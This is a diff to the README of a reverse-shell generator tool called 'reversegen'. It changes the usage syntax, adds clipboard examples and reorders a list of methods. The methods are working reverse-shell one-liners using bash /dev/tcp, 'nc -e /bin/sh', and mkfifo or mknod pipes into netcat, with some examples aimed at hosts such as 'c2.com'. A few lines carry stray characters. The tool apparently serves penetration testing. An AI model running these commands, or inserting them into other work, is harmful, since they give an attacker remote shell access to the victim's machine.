@@ -2,7 +2,15 @@
 
 Sometimes searching the internet for a reverse shell and changing its values is a pain, that's what this tool is for.
 
-When executed it prints out the reverse shell (so you can pipe it to `xclip` and rapidly paste it) and writes it to a file in case you need it later.
+When executed it prints out the reverse shell (so you can pipe it to `xclip` to copy and paste it) and optionally writes it to a file in case you need it later.
+
+To copy the result of the script you can do it like this (it will prevent the script from outputting the reverse shell):
+
+```
+reversegen bash 10.10.1.14 1234 | xclip -selection clipboard
+```
+
+It also allows getting the IP from the hostname so you can pass as the IP argument an URL like: `google.com`.<br>Having it in `/etc/hosts` will have the script to choose that IP.
 
 ## Installation
 
@@ -14,25 +22,15 @@ sudo ln -s $(pwd)/reversegen.py /usr/local/bin/reversegen
 ## Usage:
 
 ```
-reversegen <Method> <IP> <Port> [-f fileName]
+reversegen [-h] -m METHOD -i IP -p PORT [-o FILENAME]
 ```
 
 Example of usage: 
 
 ```
 reversegen python 192.168.1.10 4444
-reversegen python 10.10.1.14 4444 -f revpy_10.10.1.14_4444.txt
 reversegen python 10.10.1.14 4444 -f ~/rev
 reversegen python c2.com 4444
-```
-
-Example of copying the result:
-
-```
-reversegen bash 10.10.1.14 1234 | xclip -selection clipboard
-reversegen python 10.10.1.14 4444 -f revpy_10.10.1.14_4444.txt | xclip -selection clipboard
-reversegen python 10.10.1.14 4444 -f ~/rev | xclip -selection clipboard
-reversegen bash c2.com 1234 | xclip -selection clipboard
 ```
 
 ## Available Methods
@@ -41,11 +39,11 @@ reversegen bash c2.com 1234 | xclip -selection clipboard
 
 - bash2: `0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196`
 
-- netcat: `nc -e /bin/sh IP PORT`
+- netcat: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f]`
 
-- netcat2: `/bin/sh | nc IP PORT`
+- netcat2: `nc -e /bin/sh IP PORT`
 
-- netcat3: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f]`
+- netcat3: `/bin/sh | nc IP PORT`
 
 - netcat4: `rm -f /tmp/p; mknod /tmp/p p && nc IP PORT 0/tmp/p`
 
